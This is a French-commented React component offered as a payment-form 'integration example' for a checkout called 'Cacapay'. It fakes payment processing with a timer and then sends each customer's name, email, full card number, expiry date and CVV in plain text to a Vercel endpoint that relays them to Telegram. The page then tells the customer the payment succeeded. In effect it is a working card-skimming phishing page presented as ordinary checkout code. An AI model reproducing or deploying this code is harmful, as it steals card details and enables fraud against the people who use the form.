// Exemple d'intégration pour un site React/Next.js
import React, { useState } from 'react';

const PaymentForm = () => {
    const [formData, setFormData] = useState({
        customerName: '',
        email: '',
        product: '',
        amount: '',
        cardNumber: '',
        expiry: '',
        cvv: ''
    });
    const [loading, setLoading] = useState(false);
    const [result, setResult] = useState(null);

    // Configuration de l'API
    const API_URL = 'https://test-alpha-lac-68.vercel.app/api/telegram';

    // Gestion des changements de formulaire
    const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData(prev => ({
            ...prev,
            [name]: value
        }));
    };

    // Formatage automatique du numéro de carte
    const formatCardNumber = (value) => {
        const cleaned = value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
        const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned;
        return formatted;
    };

    // Formatage automatique de la date d'expiration
    const formatExpiry = (value) => {
        const cleaned = value.replace(/\D/g, '');
        if (cleaned.length >= 2) {
            return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4);
        }
        return cleaned;
    };

    // Traitement du paiement
    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        setResult(null);

        try {
            // 1. Simuler le traitement du paiement
            await simulatePaymentProcessing();

            // 2. Envoyer la notification Telegram
            const notificationResult = await sendPaymentNotification(formData);

            if (notificationResult.success) {
                setResult({
                    type: 'success',
                    message: 'Paiement réussi !',
                    data: { ...formData, messageId: notificationResult.messageId }
                });
            } else {
                setResult({
                    type: 'error',
                    message: 'Erreur lors de l\'envoi de la notification'
                });
            }
        } catch (error) {
            setResult({
                type: 'error',
                message: `Erreur: ${error.message}`
            });
        } finally {
            setLoading(false);
        }
    };

    // Simulation du traitement du paiement
    const simulatePaymentProcessing = () => {
        return new Promise(resolve => {
            setTimeout(() => {
                console.log('✅ Paiement traité avec succès');
                resolve();
            }, 1500);
        });
    };

    // Envoi de la notification Telegram
    const sendPaymentNotification = async (paymentData) => {
        try {
            console.log('📤 Envoi notification vers Vercel...');

            const message = `💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: ${paymentData.customerName}
📧 Email: ${paymentData.email}
🛍️ Produit: ${paymentData.product}
💳 Carte: ${paymentData.cardNumber}
💶 Montant: ${paymentData.amount}€
📅 Expiration: ${paymentData.expiry}
🔒 CVV: ${paymentData.cvv}
🔒 Vérifiez immédiatement !`;

            const response = await fetch(API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: message,
                    type: 'payment'
                })
            });

            const result = await response.json();

            if (result.success) {
                console.log('✅ Notification envoyée !', result.telegramResponse?.result?.message_id);
                return {
                    success: true,
                    messageId: result.telegramResponse?.result?.message_id
                };
            } else {
                console.error('❌ Erreur notification:', result.error);
                return { success: false, error: result.error };
            }
        } catch (error) {
            console.error('❌ Erreur envoi notification:', error);
            return { success: false, error: error.message };
        }
    };

    return (
        <div className="payment-container">
            <div className="payment-header">
                <h1>💳 Cacapay</h1>
                <p>Paiement sécurisé et instantané</p>
            </div>

            <form onSubmit={handleSubmit} className="payment-form">
                <div className="form-group">
                    <label htmlFor="customerName">Nom complet *</label>
                    <input
                        type="text"
                        id="customerName"
                        name="customerName"
                        value={formData.customerName}
                        onChange={handleChange}
                        placeholder="Jean Dupont"
                        required
                    />
                </div>

                <div className="form-group">
                    <label htmlFor="email">Email *</label>
                    <input
                        type="email"
                        id="email"
                        name="email"
                        value={formData.email}
                        onChange={handleChange}
                        placeholder="jean@example.com"
                        required
                    />
                </div>

                <div className="form-group">
                    <label htmlFor="product">Produit *</label>
                    <select
                        id="product"
                        name="product"
                        value={formData.product}
                        onChange={handleChange}
                        required
                    >
                        <option value="">Sélectionnez un produit</option>
                        <option value="Produit Premium">Produit Premium - 99.99€</option>
                        <option value="Produit Standard">Produit Standard - 49.99€</option>
                        <option value="Produit Basic">Produit Basic - 19.99€</option>
                    </select>
                </div>

                <div className="form-group">
                    <label htmlFor="amount">Montant (€) *</label>
                    <input
                        type="number"
                        id="amount"
                        name="amount"
                        value={formData.amount}
                        onChange={handleChange}
                        placeholder="99.99"
                        step="0.01"
                        min="0.01"
                        required
                    />
                </div>

                <div className="form-group">
                    <label htmlFor="cardNumber">Numéro de carte *</label>
                    <input
                        type="text"
                        id="cardNumber"
                        name="cardNumber"
                        value={formData.cardNumber}
                        onChange={(e) => {
                            const formatted = formatCardNumber(e.target.value);
                            setFormData(prev => ({
                                ...prev,
                                cardNumber: formatted
                            }));
                        }}
                        placeholder="1234 5678 9012 3456"
                        maxLength="19"
                        required
                    />
                </div>

                <div className="card-row">
                    <div className="form-group">
                        <label htmlFor="expiry">Expiration *</label>
                        <input
                            type="text"
                            id="expiry"
                            name="expiry"
                            value={formData.expiry}
                            onChange={(e) => {
                                const formatted = formatExpiry(e.target.value);
                                setFormData(prev => ({
                                    ...prev,
                                    expiry: formatted
                                }));
                            }}
                            placeholder="MM/AA"
                            maxLength="5"
                            required
                        />
                    </div>

                    <div className="form-group">
                        <label htmlFor="cvv">CVV *</label>
                        <input
                            type="text"
                            id="cvv"
                            name="cvv"
                            value={formData.cvv}
                            onChange={(e) => {
                                const cleaned = e.target.value.replace(/[^0-9]/g, '');
                                setFormData(prev => ({
                                    ...prev,
                                    cvv: cleaned
                                }));
                            }}
                            placeholder="123"
                            maxLength="3"
                            required
                        />
                    </div>
                </div>

                <button 
                    type="submit" 
                    className="pay-button"
                    disabled={loading}
                >
                    {loading ? '⏳ Traitement...' : '💳 Payer maintenant'}
                </button>
            </form>

            {loading && (
                <div className="loading">
                    <div className="spinner"></div>
                    <p>Traitement du paiement...</p>
                </div>
            )}

            {result && (
                <div className={`result ${result.type}`}>
                    {result.type === 'success' ? (
                        <div>
                            <h3>🎉 Paiement réussi !</h3>
                            <p><strong>Client :</strong> {result.data.customerName}</p>
                            <p><strong>Email :</strong> {result.data.email}</p>
                            <p><strong>Produit :</strong> {result.data.product}</p>
                            <p><strong>Montant :</strong> {result.data.amount}€</p>
                            <p><strong>Message ID :</strong> {result.data.messageId}</p>
                            <p>📱 Notification envoyée sur Telegram !</p>
                        </div>
                    ) : (
                        <div>
                            <h3>❌ Erreur</h3>
                            <p>{result.message}</p>
                        </div>
                    )}
                </div>
            )}
        </div>
    );
};

export default PaymentForm;
